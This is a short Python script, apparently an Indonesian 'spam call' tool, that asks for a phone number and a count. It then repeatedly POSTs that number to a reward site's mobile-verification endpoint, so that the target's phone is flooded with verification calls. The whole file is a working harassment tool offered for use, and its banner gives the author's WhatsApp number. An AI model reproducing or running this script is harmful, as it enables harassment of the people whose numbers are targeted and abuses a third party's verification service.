import os,sys,requests,json

os.system('clear')
Rm = """
         Spam Telepon / Call

  Author   : Rizki
  Github   : https://github.com/Rm-12/
  WhatsApp : 85765351658

 Spam Call / Telepon Di Awali Dengan
          Contoh Penggunaan:

  = 81234567891
«~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~»\n
"""
print (Rm)
no=input('Nomor : ')
jm=int(input('Jumlah : '))

url="https://id.jagreward.com/member/verify-mobile/"
for i in range (int(jm)):
   res = requests.post(url+no)
   xp = json.loads(res.text)
   if xp["result"]==1:
      print ('[*] Spaming Sukses |')
   else :
      print ('[*] Spaming Gagal |')
